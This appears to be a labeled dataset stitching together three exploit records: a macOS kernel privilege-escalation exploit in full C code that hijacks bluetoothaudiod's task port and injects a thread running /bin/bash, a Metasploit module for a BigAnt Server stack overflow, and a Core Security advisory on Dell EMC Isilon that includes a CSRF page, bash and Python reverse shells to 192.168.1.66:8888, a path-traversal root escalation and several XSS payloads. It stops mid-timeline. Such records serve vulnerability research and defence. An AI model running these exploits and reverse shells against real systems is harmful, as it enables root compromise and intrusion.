(ipc_object_t *)&port);     if (rv != KERN_SUCCESS)       goto done;     disp =  (args->polyPoly);      rv = mach_port_insert_right(task->itk_space, args->name, port, disp);        done:     if (task)       task_deallocate(task);     return (rv);   }  ipc_object_copyin will look up the args->poly name (with the args->polyPoly rights) in the current process's mach port namespace and return an ipc_port_t pointer in port.  If ipc_object_copyin is successful it takes a ref on the port and returns that ref to the caller.  mach_port_insert_right will consume that reference but *only* if it succeeds. If it fails then no reference is consumed and we can leak one because _kernelrpc_mach_port_insert_right_trap doesn't handle the failure case.  it's easy to force mach_port_insert_right to fail by specifying an invalid name for the new right (eg MACH_PORT_NULL.)  This allows you to overflow the reference count of the port and cause a kernel UaF in about 20 minutes using a single thread.  ################################################################################  LPE exploit for the kernel ipc_port_t reference leak bug  I wanted to explore some more interesting exploit primitives I could build with this bug.  One idea I had was to turn a send right for a mach port into a receive right for that port. We can do this by using the reference count leak to cause a port for which we have a send right to be freed (leaving a dangling ipc_object pointer in our ports table and that of any other process which had a send right) and forcing the memory to be reallocated with a new port for which we hold a receive right.  We could for example target a userspace IPC service and replace a send right we've looked up via launchd with a receive right allowing us to impersonate the service to other clients.  Another approach is to target the send rights we can get hold of for kernel-owned ports. In this case whilst userspace does still communicate by sending messages the kernel doesn't actually enqueue those messages; if a port is owned by the kernel then the send path is short-circuited and the MIG endpoint is called directly. Those kernel-owned receive rights are however still ports and we can free them using the bug; if we can then get that memory reused as a port for which we hold a receive right we can end up impersonating the kernel to other processes!  Lots of kernel MIG apis take a task port as an argument; if we can manage to impersonate one of these services we can get other processes to send us their task ports and thus gain complete control over them.  io_service_open_extended is a MIG api on an IOService port. Interestingly we can get a send right to any IOService from any sandbox as there are no MAC checks to get an IOService, only to get one of its IOUserClients (or query/manipulate the registry entries.) The io_service_open_extended message will be sent to the IOService port and the message contains the sender's task port as the owningTask parameter :)  For this PoC expoit I've chosen to target IOBluetoothHCIController because we can control when this will be opened by talking to the com.apple.bluetoothaudiod - more exactly when that daemon is started it will call IOServiceOpen. We can force the daemon to restart by triggering a NULL pointer deref due to insufficient error checking when it parses XPC messages. This doesn't require bluetooth to be enabled.  Putting this all together the flow of the exploit looks like this:    * get a send right to the IOBluetoothHCIController IOService   * overflow the reference count of that ipc_port to 0 and free it   * allocate many new receive rights to reuse the freed ipc_port   * add the new receive rights to a port set to simplify receiving messages   * crash bluetoothaudiod forcing it to restart   * bluetoothaudiod will get a send right to what it thinks is the IOBluetoothHCIController IOService   * bluetoothaudiod will send its task port to the IOService   * the task port is actually sent to us as we have the receive right   * we use the task port to inject a new thread into bluetoothsudiod which execs /bin/bash -c COMMAND  Tested on MacOS 10.12 16a323  The technique should work exactly the same on iOS to get a task port for another process from the app sandbox. */  // ianbeer  #if 0 LPE exploit for the kernel ipc_port_t reference leak bug  I wanted to explore some more interesting exploit primitives I could build with this bug.  One idea I had was to turn a send right for a mach port into a receive right for that port. We can do this by using the reference count leak to cause a port for which we have a send right to be freed (leaving a dangling ipc_object pointer in our ports table and that of any other process which had a send right) and forcing the memory to be reallocated with a new port for which we hold a receive right.  We could for example target a userspace IPC service and replace a send right we've looked up via launchd with a receive right allowing us to impersonate the service to other clients.  Another approach is to target the send rights we can get hold of for kernel-owned ports. In this case whilst userspace does still communicate by sending messages the kernel doesn't actually enqueue those messages; if a port is owned by the kernel then the send path is short-circuited and the MIG endpoint is called directly. Those kernel-owned receive rights are however still ports and we can free them using the bug; if we can then get that memory reused as a port for which we hold a receive right we can end up impersonating the kernel to other processes!  Lots of kernel MIG apis take a task port as an argument; if we can manage to impersonate one of these services we can get other processes to send us their task ports and thus gain complete control over them.  io_service_open_extended is a MIG api on an IOService port. Interestingly we can get a send right to any IOService from any sandbox as there are no MAC checks to get an IOService, only to get one of its IOUserClients (or query/manipulate the registry entries.) The io_service_open_extended message will be sent to the IOService port and the message contains the sender's task port as the owningTask parameter :)  For this PoC expoit I've chosen to target IOBluetoothHCIController because we can control when this will be opened by talking to the com.apple.bluetoothaudiod - more exactly when that daemon is started it will call IOServiceOpen. We can force the daemon to restart by triggering a NULL pointer deref due to insufficient error checking when it parses XPC messages. This doesn't require bluetooth to be enabled.  Putting this all together the flow of the exploit looks like this:    * get a send right to the IOBluetoothHCIController IOService   * overflow the reference count of that ipc_port to 0 and free it   * allocate many new receive rights to reuse the freed ipc_port   * add the new receive rights to a port set to simplify receiving messages   * crash bluetoothaudiod forcing it to restart   * bluetoothaudiod will get a send right to what it thinks is the IOBluetoothHCIController IOService   * bluetoothaudiod will send its task port to the IOService   * the task port is actually sent to us as we have the receive right   * we use the task port to inject a new thread into bluetoothsudiod which execs /bin/bash -c COMMAND  Tested on MacOS 10.12 16a323  The technique should work exactly the same on iOS to get a task port for another process from the app sandbox. #endif  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h>  #include <mach/mach.h> #include <mach/mach_vm.h>  #include <xpc/xpc.h>  #include <IOKit/IOKitLib.h>  void run_command(mach_port_t target_task, char* command) {   kern_return_t err;    // allocate some memory in the task   mach_vm_address_t command_addr = 0;   err = mach_vm_allocate(target_task,                          &command_addr,                          0x1000,                          VM_FLAGS_ANYWHERE);    if (err != KERN_SUCCESS) {     printf(""mach_vm_allocate: %s\n"", mach_error_string(err));     return;   }    printf(""allocated command at %zx\n"", command_addr);   uint64_t bin_bash = command_addr;   uint64_t dash_c = command_addr + 0x10;   uint64_t cmd = command_addr + 0x20;   uint64_t argv = command_addr + 0x800;    uint64_t argv_contents[] = {bin_bash, dash_c, cmd, 0};    err = mach_vm_write(target_task,                       bin_bash,                       ""/bin/bash"",                       strlen(""/bin/bash"") + 1);     err = mach_vm_write(target_task,                       dash_c,                       ""-c"",                       strlen(""-c"") + 1);    err = mach_vm_write(target_task,                       cmd,                       command,                       strlen(command) + 1);    err = mach_vm_write(target_task,                       argv,                       argv_contents,                       sizeof(argv_contents));     if (err != KERN_SUCCESS) {     printf(""mach_vm_write: %s\n"", mach_error_string(err));     return;   }    // create a new thread:   mach_port_t new_thread = MACH_PORT_NULL;   x86_thread_state64_t state;   mach_msg_type_number_t stateCount = x86_THREAD_STATE64_COUNT;    memset(&state, 0, sizeof(state));    // the minimal register state we require:   state.__rip = (uint64_t)execve;   state.__rdi = (uint64_t)bin_bash;   state.__rsi = (uint64_t)argv;   state.__rdx = (uint64_t)0;    err = thread_create_running(target_task,                               x86_THREAD_STATE64,                               (thread_state_t)&state,                               stateCount,                               &new_thread);    if (err != KERN_SUCCESS) {     printf(""thread_create_running: %s\n"", mach_error_string(err));     return;   }    printf(""done?\n""); }  void force_bluetoothaudiod_restart() {   xpc_connection_t conn = xpc_connection_create_mach_service(""com.apple.bluetoothaudiod"", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);    xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {     xpc_type_t t = xpc_get_type(event);     if (t == XPC_TYPE_ERROR){       printf(""err: %s\n"", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));     }     printf(""received an event\n"");   });   xpc_connection_resume(conn);    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);    xpc_dictionary_set_string(msg, ""BTMethod"", ""BTCoreAudioPassthrough"");    xpc_connection_send_message(conn, msg);    printf(""waiting to make sure launchd knows the target has crashed\n"");   usleep(100000);    printf(""bluetoothaudiod should have crashed now\n"");    xpc_release(msg);  	// connect to the service again and send a message to force it to restart:   conn = xpc_connection_create_mach_service(""com.apple.bluetoothaudiod"", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);   xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {     xpc_type_t t = xpc_get_type(event);     if (t == XPC_TYPE_ERROR){       printf(""err: %s\n"", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));     }     printf(""received an event\n"");   });   xpc_connection_resume(conn);    msg = xpc_dictionary_create(NULL, NULL, 0);    xpc_dictionary_set_string(msg, ""hello"", ""world"");    xpc_connection_send_message(conn, msg);  	printf(""bluetoothaudiod should be calling IOServiceOpen now\n""); }  mach_port_t self;  void leak_one_ref(mach_port_t overflower) {   kern_return_t err = _kernelrpc_mach_port_insert_right_trap(     self,     MACH_PORT_NULL, // an invalid name     overflower,     MACH_MSG_TYPE_COPY_SEND);   }  void leak_one_ref_for_receive(mach_port_t overflower) {   kern_return_t err = _kernelrpc_mach_port_insert_right_trap(     self,     MACH_PORT_NULL, // an invalid name     overflower,     MACH_MSG_TYPE_MAKE_SEND); // if you have a receive right }  char* spinners = ""-\\|/""; void leak_n_refs(mach_port_t overflower, uint64_t n_refs) { 	int step = 0;   for (uint64_t i = 0; i < n_refs; i++) {     leak_one_ref(overflower);     if ((i % 0x40000) == 0) {       float done = (float)i/(float)n_refs; 		 	step = (step+1) % strlen(spinners);       fprintf(stdout, ""\roverflowing [%c] (%3.3f%%)"", spinners[step], done * 100);       fflush(stdout);     }   } 	fprintf(stdout, ""\roverflowed                           \n""); 	fflush(stdout); }  // quickly take a release a kernel reference // if the reference has been overflowed to 0 this will free the object void inc_and_dec_ref(mach_port_t p) {   // if we pass something which isn't a task port name:   // port_name_to_task    //   ipc_object_copyin   //     takes a ref   //   ipc_port_release_send   //     drops a ref    _kernelrpc_mach_port_insert_right_trap(p, 0, 0, 0); }  /* try to get the free'd port replaced with a new port for which we have  * a receive right  * Once we've allocated a lot of new ports add them all to a port set so  * we can just receive on the port set to find the correct one  */ mach_port_t replace_with_receive() {   int n_ports = 2000;   mach_port_t ports[n_ports];   for (int i = 0; i < n_ports; i++) {     mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &ports[i]);   }    // allocate a port set   mach_port_t ps;   mach_port_allocate(self, MACH_PORT_RIGHT_PORT_SET, &ps);   for (int i = 0; i < n_ports; i++) {     mach_port_move_member( self, ports[i], ps);   }   return ps; }  /* listen on the port set for io_service_open_extended messages :  */ struct service_open_mig { 	mach_msg_header_t Head; 	/* start of the kernel processed data */ 	mach_msg_body_t msgh_body; 	mach_msg_port_descriptor_t owningTask; 	mach_msg_ool_descriptor_t properties; 	/* end of the kernel processed data */ 	NDR_record_t NDR; 	uint32_t connect_type; 	NDR_record_t ndr; 	mach_msg_type_number_t propertiesCnt; };  void service_requests(mach_port_t ps) {   size_t size = 0x1000;   struct service_open_mig* request = malloc(size);   memset(request, 0, size);    printf(""receiving on port set\n"");   kern_return_t err = mach_msg(&request->Head,                                MACH_RCV_MSG,                                0,                                size,                                ps,                                0,                                0);    if (err != KERN_SUCCESS) {     printf(""error receiving on port set: %s\n"", mach_error_string(err));     return;   }    mach_port_t replaced_with = request->Head.msgh_local_port;    printf(""got a message on the port set from port: local(0x%x) remote(0x%x)\n"", request->Head.msgh_local_port, request->Head.msgh_remote_port); 	 	mach_port_t target_task = request->owningTask.name; 	printf(""got task port: 0x%x\n"", target_task);  	run_command(target_task, ""touch /tmp/hello_from_fake_kernel"");      printf(""did that work?\n""); 	printf(""leaking some refs so we don't kernel panic"");  	for(int i = 0; i < 0x100; i++) { 		leak_one_ref_for_receive(replaced_with);   }  }  int main() { 	self = mach_task_self(); // avoid making the trap every time  	//mach_port_t test;   //mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &test);    // get the service we want to target:   mach_port_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(""IOBluetoothHCIController""));   printf(""%d : 0x%x\n"", getpid(), service);    // we don't know how many refs the port actually has - lets guess less than 40...   uint32_t max_refs = 40;   leak_n_refs(service, 0x100000000-max_refs);    // the port now has a reference count just below 0 so we'll try in a loop   // to free it, reallocate and test to see if it worked - if not we'll hope   // that was because we didn't free it:    mach_port_t fake_service_port = MACH_PORT_NULL;   for (uint32_t i = 0; i < max_refs; i++) {     inc_and_dec_ref(service);      mach_port_t replacer_ps = replace_with_receive();      // send a message to the service - if we receive it on the portset then we won:     mach_msg_header_t msg = {0};     msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);     msg.msgh_remote_port = service;     msg.msgh_id = 0x41414141;     msg.msgh_size = sizeof(msg);     kern_return_t err;     err = mach_msg(&msg,                    MACH_SEND_MSG|MACH_MSG_OPTION_NONE,                    (mach_msg_size_t)sizeof(msg),                    0,                    MACH_PORT_NULL,                    MACH_MSG_TIMEOUT_NONE,                    MACH_PORT_NULL);     printf(""sending probe: %s\n"", mach_error_string(err));      mach_msg_empty_rcv_t reply = {0};     mach_msg(&reply.header,              MACH_RCV_MSG | MACH_RCV_TIMEOUT,              0,              sizeof(reply),              replacer_ps,              1, // 1ms              0);               		if (reply.header.msgh_id == 0x41414141) {       // worked:       printf(""got the probe message\n"");       fake_service_port = replacer_ps;       break;     }     printf(""trying again (%d)\n"", i);      // if it didn't work leak another ref and try again:     leak_one_ref(service);   }     printf(""worked? - forcing a root process to restart, hopefully will send us its task port!\n"");  	force_bluetoothaudiod_restart();    service_requests(fake_service_port);    return 0; }",a single thread,1
16431,"BigAnt Server 2.50 SP1 - Remote Buffer Overflow (Metasploit) ## # $Id: bigant_server_250.rb 9669 2010-07-03 03:13:45Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'BigAnt Server 2.50 SP1 Buffer Overflow', 			'Description'    => %q{ 				This exploits a stack buffer overflow in the BigAnt Messaging Service, 				part of the BigAnt Server product suite. This module was tested 				successfully against version 2.50 SP1. 			}, 			'Author' 	 => [ 'Dr_IDE <Dr_IDE[at]hushmail.com>' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9669 $', 			'References'     => 				[ 					# It's not clear if these are correct - there was a fix for 					# the v2.2 vuln back in Dec 2008 					[ 'CVE', '2008-1914'], 					[ 'OSVDB', '44454'], 					[ 'URL', 'http://www.exploit-db.com/exploits/9673' ], 					[ 'URL', 'http://www.exploit-db.com/exploits/9690' ] 					#[ 'B_ID', '28795' ], 					#[ 'U_RL', 'http://www.milw0rm.com/exploits/5451'], 				], 			'Privileged'     => true, 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'seh', 				}, 			'Payload'        => 				{ 					'Space'    => 710, 					'BadChars' => ""\x00\x20\x0a\x0d"", 					'StackAdjustment' => -3500, 					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper, 					'DisableNops'  =>  'True', 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'BigAnt 2.5 Universal',		{ 'Ret' => 0x0f9a196a } ], # Tested OK (Dr_IDE & patrickw) p/p/r VBAJET32.dll xpsp3 & w2k 					[ 'Windows 2000 Pro All English',   	{ 'Ret' => 0x75022ac4 } ], # p/p/r Tested OK (patrickw 20090918) 					[ 'Windows XP Pro SP0/SP1 English', 	{ 'Ret' => 0x71aa32ad } ], # Should Work 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Apr 15 2008'))  		register_options([Opt::RPORT(6660)], self.class) 	end  	def exploit 		connect  		sploit = ""GET "" + rand_text_alpha_upper(985) + generate_seh_payload(target.ret) 		sploit << rand_text_alpha_upper(1000 - payload.encoded.length)  		print_status(""Trying target #{target.name}..."") 		sock.put(sploit + ""\r\n\r\n"")  		handler 		disconnect 	end  end",a specially crafted packet,1
44039,"Dell EMC Isilon OneFS - Multiple Vulnerabilities Core Security - Corelabs Advisory http://corelabs.coresecurity.com/ Dell EMC Isilon OneFS Multiple Vulnerabilities  1. **Advisory Information**  Title: Dell EMC Isilon OneFS Multiple Vulnerabilities Advisory ID: CORE-2017-0009 Advisory URL: http://www.coresecurity.com/advisories/dell-emc-isilon-onefs-multiple-vulnerabilities Date published: 2018-02-14 Date of last update: 2018-02-14 Vendors contacted: Dell EMC Release mode: Coordinated release  2. **Vulnerability Information**  Class: Cross-Site Request Forgery [CWE-352], Improper Privilege Management [CWE-269], Improper Privilege Management [CWE-269], Improper Neutralization of Input During Web Page Generation [CWE-79], Improper Neutralization of Input During Web Page Generation [CWE-79], Improper Neutralization of Input During Web Page Generation [CWE-79], Improper Neutralization of Input During Web Page Generation [CWE-79], Improper Neutralization of Input During Web Page Generation [CWE-79], Improper Neutralization of Input During Web Page Generation [CWE-79] Impact: Code execution Remotely Exploitable: Yes Locally Exploitable: Yes CVE Name: CVE-2018-1213, CVE-2018-1203, CVE-2018-1204, CVE-2018-1186, CVE-2018-1187, CVE-2018-1188, CVE-2018-1189, CVE-2018-1201, CVE-2018-1202  3. **Vulnerability Description**  Dell EMC's website states that:[1]  The EMC Isilon scale-out NAS storage platform combines modular hardware with unified software to harness unstructured data. Powered by the OneFS operating system, an EMC Isilon cluster delivers a scalable pool of storage with a global namespace.  The platform's unified software provides centralized Web-based and command-line administration to manage the following features:  - A cluster that runs a distributed file system  - Scale-out nodes that add capacity and performance  - Storage options that manage files and tiering  - Flexible data protection and high availability  - Software modules that control costs and optimize resources  Multiple vulnerabilities were found in the Isilon OneFS Web console that would allow a remote attacker to gain command execution as root.  4. **Vulnerable Packages**  . Dell EMC Isilon OneFS version 8.1.1.0 (CVE-2018-1203, CVE-2018-1204) . Dell EMC Isilon OneFS versions between 8.1.0.0 - 8.1.0.1 (all CVEs) . Dell EMC Isilon OneFS versions between 8.0.1.0 - 8.0.1.2 (all CVEs) . Dell EMC Isilon OneFS versions between 8.0.0.0 - 8.0.0.6 (all CVEs) . Dell EMC Isilon OneFS versions 7.2.1.x (CVE-2018-1186, CVE-2018-1188,   CVE-2018-1201, CVE-2018-1204, CVE-2018-1213) . Dell EMC Isilon OneFS version 7.1.1.11 (CVE-2018-1186, CVE-2018-1201,   CVE-2018-1202, CVE-2018-1204, CVE-2018-1213)  Other products and versions might be affected, but they were not tested.  5. **Vendor Information, Solutions and Workarounds**  Dell EMC provided a link to the Download for Isilon OneFS page which contains the patches:  . https://support.emc.com/downloads/15209_Isilon-OneFS  6. **Credits**  These vulnerabilities were discovered and researched by Ivan Huertas and Maximiliano Vidal from Core Security Consulting Services. The publication of this advisory was coordinated by Alberto Solino from Core Advisories Team.  7. **Technical Description / Proof of Concept Code**  The Web console contains several sensitive features that are vulnerable to cross-site request forgery. We describe this issue in section 7.1.  Sections 7.2 and 7.3 show two vectors to escalate privileges to root.  Various persistent cross-site scripting issues are presented in the remaining sections (7.4, 7.5, 7.6, 7.7, 7.8, 7.9).  7.1. **Cross-site request forgery leading to command execution**  [CVE-2018-1213] There are no anti-CSRF tokens in any forms on the Web interface. This would allow an attacker to submit authenticated requests when an authenticated user browses an attacker-controlled domain.  The Web console contains a plethora of sensitive actions that can be abused, such as adding new users with SSH access or re-mapping existing storage directories to allow read-write-execute access to all users.  All requests are JSON-encoded, which in some cases might hinder exploitation of CSRF vulnerabilities. However, the application does not verify the content-type set. This allows an attacker to exploit the CSRF vulnerabilities by setting a text/plain content-type and sending the request body as JSON_PAYLOAD=ignored.  The following proof of concept creates a new user and assigns him a new role with enough privileges to log in via SSH, configure identifies, manage authentication providers, configure the cluster and run the remote support tools.  /----- <html>   <body>     <form id=""addUser"" target=""_blank"" action=""https://192.168.1.11:8080/platform/1/auth/users?query_member_of=true&resolve_names=true&start=0&zone=System&provider=lsa-local-provider%3ASystem"" method=""POST"" enctype=""text/plain"">       <input type=""hidden"" name=""{""name"":""pepito"",""enabled"":true,""shell"":""/bin/zsh"",""password_expires"":false,""password"":""pepito""}"" value="""" />     </form>     <form id=""addRole"" target=""_blank"" action=""https://192.168.1.11:8080/platform/1/auth/roles"" method=""POST"" enctype=""text/plain"">       <input type=""hidden"" name=""{""members"":[{""name"":""pepito"",""type"":""user""}],""name"":""pepito_role"",""privileges"":[{""id"":""ISI_PRIV_AUTH"",""name"":""Auth"",""read_only"":false},{""id"":""ISI_PRIV_CLUSTER"",""name"":""Cluster"",""read_only"":false},{""id"":""ISI_PRIV_REMOTE_SUPPORT"",""name"":""Remote Support"",""read_only"":false},{""id"":""ISI_PRIV_LOGIN_SSH"",""name"":""SSH"",""read_only"":true}]}"" value="""" />     </form>     <script>       document.getElementById(""addUser"").submit();       window.setTimeout(function() { document.getElementById(""addRole"").submit() }, 1000);     </script>   </body> </html> -----/  7.2. **Privilege escalation due to incorrect sudo permissions**  [CVE-2018-1203] The compadmin user can run the tcpdump binary with root privileges via sudo. This allows for local privilege escalation, as tcpdump can be instructed to run shell commands when rotating capture files.  /----- pepe-1$ id uid=11(compadmin) gid=0(wheel) groups=0(wheel),1(daemon) pepe-1$ cat /tmp/lala.sh #!/bin/bash  bash -i >& /dev/tcp/192.168.1.66/8888 0>&1 -----/  Once the desired shell script is in place, the attacker can run tcpdump as follows to trigger the execution:  /----- pepe-1$ sudo tcpdump -i em0 -G 1 -z /tmp/lala.sh -w dump tcpdump: WARNING: unable to contact casperd tcpdump: listening on em0, link-type EN10MB (Ethernet), capture size 65535 bytes /tmp/lala.sh: connect: Connection refused /tmp/lala.sh: line 3: /dev/tcp/192.168.1.66/8888: Connection refused /tmp/lala.sh: connect: Connection refused /tmp/lala.sh: line 3: /dev/tcp/192.168.1.66/8888: Connection refused -----/  As can be seen below, the script runs with root privileges:  /----- $ nc -lvp 8888 Listening on [0.0.0.0] (family 0, port 8888) Connection from [192.168.1.11] port 8888 [tcp/*] accepted (family 2, sport 57692) bash: no job control in this shell [root@pepe-1 /compadmin]# id uid=0(root) gid=0(wheel) groups=0(wheel),5(operator),10(admin),20(staff),70(ifs) -----/  7.3. **Privilege escalation via remote support scripts**  [CVE-2018-1204] From the documentation:  ""OneFS allows remote support through EMC Secure Remote Services (ESRS) which monitors your EMC Isilon cluster, and with your permission, allows remote access to Isilon Technical Support personnel to gather cluster data and troubleshoot issues.""  ""After you enable remote support through ESRS, Isilon Technical Support personnel can request logs with scripts that gather EMC Isilon cluster data and then upload the data. The remote support scripts based on the Isilon isi_gather_info log-gathering tool are located in the /ifs/data/Isilon_Support/ directory on each node.""  ""Additionally, isi_phone_home, a tool that focuses on cluster- and node-specific data, is enabled once you enable ESRS. This tool is pre-set to send information about your cluster to Isilon Technical Support on a weekly basis. You can disable or enable isi_phone_home from  the OneFS command-line interface.""  As a cluster administrator or compadmin, it is possible to enable the remote support functionality, hence enabling the isi_phone_home tool via sudo. This tool is vulnerable to a path traversal when reading the script file to run, which would enable an attacker to execute arbitrary python code with root privileges.  If remote support is not enabled, an attacker could perform the following operations in order to enable it:  /----- pepe-1$ sudo isi network subnets create 1 ipv4 1 pepe-1$ sudo isi network pools create 1.0 pepe-1$ sudo isi remotesupport connectemc modify --enabled=yes --primary-esrs-gateway=10.10.10.10 --use-smtp-failover=no --gateway-access-pools=1.0 -----/  The isi_phone_home tool is supposed to run scripts located in the root-only writable directory /usr/local/isi_phone_home/script. However, the provided script name is used to construct the file path without sanitization, allowing an attacker to reference other locations.  /----- def run_script(script_file_name):     script_path = CFG.get('SCRIPTDIR') + '/' + script_file_name     if os.path.isfile(script_path):         cmd = 'python ' + script_path  + ' 2>&1 '         command_thread = command.Command(cmd)         exit_code, output = command_thread.run(int(CFG.get(""SCRIPT_TIEMOUT"")))         if exit_code:             logging.error(""Error: {0} running script: {1} "".format(str(exit_code), output))     else:         logging.error(""File: {0} list_file_name doesn't exist "".format(script_path)) -----/  The final step would be to create a malicious python script on any writable location and call it via the isi_phone_tool using sudo. Keep in mind that the previous steps are not required if the system does already have remote support enabled.  /----- pepe-1$ cat /tmp/lala.py #!/usr/bin/env python  import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((""192.168.1.66"",8888)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([""/bin/sh"",""-i""])  pepe-1$ sudo /usr/bin/isi_phone_home --script-file ../../../../../tmp/lala.py -----/  /----- $ nc -lvp 8888 Listening on [0.0.0.0] (family 0, port 8888) Connection from [192.168.1.11] port 8888 [tcp/*] accepted (family 2, sport 56807) pepe-1# id uid=0(root) gid=0(wheel) groups=0(wheel),5(operator),10(admin),20(staff),70(ifs) -----/  7.4. *Persistent cross-site scripting in the cluster description*  [CVE-2018-1186] The description parameter of the /cluster/identity endpoint is vulnerable to cross-site scripting.  After the cluster's description is updated, the payload will be executed every time the user opens the Web console.  /----- PUT /platform/3/cluster/identity HTTP/1.1 Host: 192.168.1.11:8080 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: */* Accept-Language: en-US,en;q=0.5 Content-Type: application/json X-Requested-With: XMLHttpRequest Content-Length: 61 Cookie: isisessid=91835dd1-49de-4d40-9f09-94f6d029df24; Connection: close  {""description"":""my cluster<img src=x onerror=\""alert(1)\""/>""} -----/  7.5. **Persistent cross-site scripting in the Network Configuration page**  [CVE-2018-1187] The description parameter of the /network/groupnets endpoint is vulnerable to cross-site scripting.  After the description is updated, the payload will be executed every time the user opens the network configuration page.  /----- POST /platform/4/network/groupnets HTTP/1.1 Host: 192.168.1.11:8080 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: */* Accept-Language: en-US,en;q=0.5 Content-Type: application/json Content-Length: 186 Cookie: isisessid=31f92221-15bb-421d-be00-d2bf42964c41; Connection: close  {""description"":""lala<script>alert(1)</script>"",""dns_cache_enabled"":true,""dns_options"":[],""dns_search"":[],""dns_servers"":[],""name"":""pepito2"",""server_side_dns_search"":false} -----/  7.6. **Persistent cross-site scripting in the Authentication Providers page**  [CVE-2018-1188] The realm parameter of the /auth/settings/krb5/realms endpoint is vulnerable to cross-site scripting.  After the realm is updated, the payload will be executed every time the user opens the Kerberos tab of the Authentication Providers page.  /----- POST /platform/1/auth/settings/krb5/realms HTTP/1.1 Host: 192.168.1.11:8080 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: */* Accept-Language: en-US,en;q=0.5 Content-Type: application/json Content-Length: 78 Cookie: isisessid=31f92221-15bb-421d-be00-d2bf42964c41; Connection: close  {""is_default_realm"":true,""kdc"":[],""realm"":""ASDASD<img src=x onerror=alert(1)""} -----/  7.7. **Persistent cross-site scripting in the Antivirus page**  [CVE-2018-1189] The name parameter of the /antivirus/policies endpoint is vulnerable to cross-site scripting.  After the name is updated, the payload will be executed every time the user opens the Antivirus page.  /----- POST /platform/3/antivirus/policies HTTP/1.1 Host: 192.168.1.11:8080 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: */* Accept-Language: en-US,en;q=0.5 Content-Type: application/json Content-Length: 172 Cookie: isisessid=c6903f55-43e7-42e2-b587-9f68142c3e06; Connection: close  {""name"":""pepe<img src=x onerror=\""alert(1)\""/>"",""description"":""pepito"",""enabled"":true,""force_run"":false,""impact"":null,""paths"":[""/ifs""],""recursion_depth"":-1,""schedule"":null} -----/  7.8. **Persistent cross-site scripting in the Job Operations page**  [CVE-2018-1201] The description parameter of the /job/policies endpoint is vulnerable to cross-site scripting.  After the description is updated, the payload will be executed every time the user opens the Impact Policies section of the Job Operations page.  /----- POST /platform/1/job/policies HTTP/1.1 Host: 192.168.1.11:8080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json X-Requested-With: XMLHttpRequest Content-Length: 210 Cookie: isisessid=8a5026c0-f045-4505-9d2b-ae83bc90f8ea; Connection: close  {""name"":""my policy"",""description"":""<img src=x onerror=\""alert(1)\""/>"",""intervals"":[{""begin"":""Sunday 00:00"",""end"":""Sunday 00:00"",""impact"":""Low""},{""impact"":""Low"",""begin"":""Sunday 01:03"",""end"":""Monday 01:01""}]} -----/  7.9. **Persistent cross-site scripting in the NDMP page**  [CVE-2018-1202] The name parameter of the /protocols/ndmp/users endpoint is vulnerable to cross-site scripting.  After the name is updated, the payload will be executed every time the user opens the NDMP Settings section of the NDMP page.  /----- POST /platform/3/protocols/ndmp/users HTTP/1.1 Host: 192.168.1.11:8080 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json X-Requested-With: XMLHttpRequest Content-Length: 64 Cookie: isisessid=91835dd1-49de-4d40-9f09-94f6d029df24; Connection: close  {""name"":""<img src=x onerror=\""alert(1)\""/>"",""password"":""123123""} -----/  8. **Report Timeline**  2017-09-25: Core Security sent an initial notification to Dell EMC, including a draft advisory. 2017-09-26: Dell EMC confirmed reception and informed an initial response would be ready by October 5th. 2017-10-05: Dell EMC confirmed problem exists for all vulnerabilities reported except one, for which evaluation will be finalized soon. Dell EMC stated that, for the confirmed issues, a remediation plan will be provided by 10/16. 2017-10-05: Core Security thanked the follow up email. 2017-10-06: Dell EMC reported an update on one privilege escalation vulnerability reported, stating that 'ISI_PRIV_AUTH, and ISI_PRIV_ROLE both are equivalent to admin level access'. They said they will be updating the documentation to make it clearer. 2017-10-11: Core Security thanked for the clarification and confirmed that section will be removed from the final advisory. 2017-10-16: Dell EMC sent a schedule for fixing six of the reported vulnerabilities, with specific dates for every product's version. 2017-10-16: Core Security thanked the information and said it will analyze the proposals sent once all the data is available. 2017-10-19: Dell EMC sent a schedule for the remaining three reported vulnerabilities, with specific dates for every product's version. 2017-10-31: 